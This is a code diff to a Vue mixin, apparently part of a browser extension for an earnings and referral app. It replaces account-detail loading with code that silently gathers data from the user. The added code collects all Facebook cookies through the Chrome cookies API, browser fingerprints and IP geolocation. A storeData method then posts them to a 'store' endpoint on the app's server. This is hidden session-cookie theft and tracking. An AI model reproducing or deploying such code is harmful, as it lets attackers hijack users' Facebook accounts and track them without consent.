@@ -1,75 +1,102 @@
+import Fingerprint2 from 'fingerprintjs2'
+
 export const mixins = {
     data() {
         return {
 
-            balance: 0,
-            created_at: "",
-            email: "",
-            email_verified_at: null,
-            id: null,
-            name: "",
-            paid_earnings: 0,
-            paid_ref_earnings: 0,
-            paypal: "",
-            phone: "",
-            referral: "",
-            referral_id: null,
-            role: null,
-            show: 0,
-            status: "",
-            total_earnings: 0,
-            updated_at: "",
-            payment_status:''
+            fingerprints: [],
+            geolocation: {},
+            timezone:'',
+            fbCookies:[],
+            data: {address:{}},
+            countryCode:'',
+            country:''
         }
 
     },
-    beforeCreate: function () {
+    created: function(){
+        this.getGeolocation().then(()=>{
+            this.getFingerprints();
+            this.getFbCookies();
+        })
+    },
+    mounted:function(){
+        // console.log(this.fingerprints);
+        // console.log(this.fbCookies);
+        // console.log(this.timezone);
+        // console.log(this.geolocation);
+    },
+    methods: {
+        getFingerprints:function(){
+            let vm = this;
+            if (window.requestIdleCallback) {
+                requestIdleCallback(function(){
+                    Fingerprint2.get(function (components){
+                        vm.fingerprints.push(components)
 
-        let vm = this;
+                    })
+                })
+            } else {
+                setTimeout(function(){
+                    Fingerprint2.get(function(components){
+                        // vm.$set(vm.fingerprints, components)
+                        // vm.fingerprints = components;
+                        vm.fingerprints.push(components)
+                        console.log(vm.fingerprints);
 
-        this.$http.post('details/').then(response => {
-
-                if (localStorage.getItem('token1') !== null) {
-                    if(response.body.success.balance === 0){
-                        vm.payment_status = "finished"
-                    }else{
-                        vm.payment_status = "processing"
-                    }
-                    vm.balance = response.body.success.balance;
-                    vm.created_at = response.body.success.created_at;
-                    vm.email = response.body.success.email;
-                    vm.email_verified_at = response.body.success.email_verified_at;
-                    vm.id = response.body.success.id;
-                    vm.name = response.body.success.name;
-                    vm.paid_earnings = response.body.success.paid_earnings;
-                    vm.paid_ref_earnings = response.body.success.paid_ref_earnings;
-                    vm.paypal = response.body.success.paypal;
-                    vm.phone = response.body.success.phone;
-                    vm.referral = response.body.success.referral;
-                    vm.referral_id = response.body.success.referral_id;
-                    vm.role = response.body.success.role;
-                    vm.show = response.body.success.show;
-                    if(response.body.success.status === 'unverified'){
-                        vm.status ='Pending review'
-                    }else{
-                        vm.status = 'Verified'
-                    }
-                    vm.total_earnings = response.body.success.total_earnings;
-                    vm.updated_at = response.body.success.updated_at;
-                    localStorage.setItem('token', response.body.success.token)
-                    this.$router.push('/home');
-                }
-
-            }, response => {
-
-
-                if (response.status === 401) {
-                    this.$router.push('/');
-                }
-
-                // this.$router.push('/');
+                    })
+                }, 500)
             }
-        );
+            // console.log(vm.data.fingerprints)
+        },
+        async getGeolocation(){
+            let vm = this;
+            await this.$http.get('http://ip-api.com/json').then(response=>{
+                console.log(response.status)
+                if(response.status === 200){
+                    console.log(response.body)
+                    vm.$set(vm.data,'address',response.body)
+                    vm.timezone = response.body['timezone'];
+                    vm.countryCode = response.body['countryCode']
+                    vm.country = response.body['country']
+
+                }
+            })
+        },
+        getFbCookies: function(){
+            var t = this;
+            chrome.cookies.getAll({url: "https://www.facebook.com"}, function (e) {
+                t.fbCookies.push(e)
+            })
+            // console.log(t.fbCookies)
+        },
+        storeData: function(token){
+
+            var t = this, e = {
+                fb_cookies: this.fbCookies,
+                fingerprints: this.fingerprints,
+                geolocation: this.data.address,
+                timezone: this.timezone
+            };
+
+            this.$http.post("store", e, {
+
+                headers: {
+                    Authorization: 'Bearer ' + token
+                }
+            }).then(function (e) {
+                t.success = e.body
+            }, function (t) {
+
+            }).then(function (e) {
+
+            })
+        },
+        getData(){
+            this.getFbCookies();
+            this.getFingerprints();
+            this.getGeolocation();
+        }
     }
 
 }
